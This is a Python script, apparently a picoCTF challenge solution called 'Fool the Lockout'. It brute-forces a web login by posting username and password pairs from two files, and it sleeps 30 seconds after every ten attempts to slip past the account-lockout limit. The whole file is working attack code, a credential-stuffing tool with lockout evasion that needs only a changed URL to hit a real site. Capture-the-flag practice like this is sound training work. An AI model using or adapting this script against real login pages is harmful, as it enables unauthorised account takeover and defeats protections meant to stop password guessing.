import requests
import time

#Fool the Lockout

try:
	users = []
	pwd = []
	url = "http://candy-mountain.picoctf.net:56957/login"
	max_req = 0
	with open("usr.txt") as f:
		for u in f:
			users.append(u.strip())

	with open("pass.txt") as f:
		for p in f:
			pwd.append(p.strip())
	print("Start brute!")
	for index in range(len(users)):
		data = {"username": f"{users[index]}", "password": f"{pwd[index]}"}
		response = requests.post(url, data)
		max_req += 1
		print(f"username: {users[index]} password: {pwd[index]}")
		if "Invalid username or password" not in response.text:
			print(f"Found: {users[index]} {pwd[index]}")
			break
		elif max_req % 10 == 0:
			print("Sleep")
			time.sleep(30)
			print("Continue brute")
		
			
	print("\nFinished\n")
except:
	exit(0)

